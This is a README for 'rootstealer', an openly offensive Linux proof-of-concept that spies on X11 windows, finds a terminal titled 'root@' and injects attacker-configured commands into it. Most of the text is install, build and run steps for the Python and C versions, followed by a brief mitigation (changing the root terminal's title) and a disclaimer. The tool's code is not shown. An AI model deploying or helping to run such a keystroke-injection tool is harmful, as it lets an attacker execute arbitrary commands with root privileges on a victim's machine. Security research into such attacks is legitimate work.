## Rootstealer
This is simple example of new attack that using X11. Program to detect when linux user opens terminal with root and inject intrusive commands in terminal with X11 lib.

## Video of Proof of concept

The proposal of this video is use the tool rootstealer to spy all gui windows interactions and inject commands only in root terminal. This approach is util when attacker need to send a malicious program to prove that user  is vulnerable  to social  engineering. Force root command in terminal with lib X11 is a exotic way to show the diversity of weak points.

https://www.youtube.com/watch?v=V8sZQq7nerw

## Install

```
# apt-get install libX11-dev libxtst-dev
# cd rootstealer/sendkeys; 
```

Edit file rootstealer/cmd.cfg and write your command to inject.

Now you can take that following:

```
# make; cd ..    #to back to path rootstealer/ 
# pip intall gi
or
# pip install gir
```
Run the python script to spy all windows gui and search window with "root@" string in title.

```
$ python rootstealer.py &
```

**Note:**
If you prefers uses full  C code... to use  simple binary purposes... you can  uses  rootstealer.c
```
$ sudo apt-get install libwnck-dev
$ gcc -o rootstealer rootstealer.c `pkg-config --cflags --libs libwnck-1.0` -DWNCK_I_KNOW_THIS_IS_UNSTABLE -DWNCK_COMPILATION
$ ./rootstealer &
```
Done, look the video demo, rootstealer force commands only on root terminal...


## Mitigation 

Don't trust in anyone.
https://www.esecurityplanet.com/views/article.php/3908881/9-Best-Defenses-Against-Social-Engineering-Attacks.htm

Always when you enter by root user, change window title:

```
# gnome-terminal --title="SOME TITLE HERE"
```

This simple action can prevent this attack.



## Tests

Tested on Xubuntu 16.04

# Note:

I am not responsible for the evil use of that tool. Use that for a good purpose.
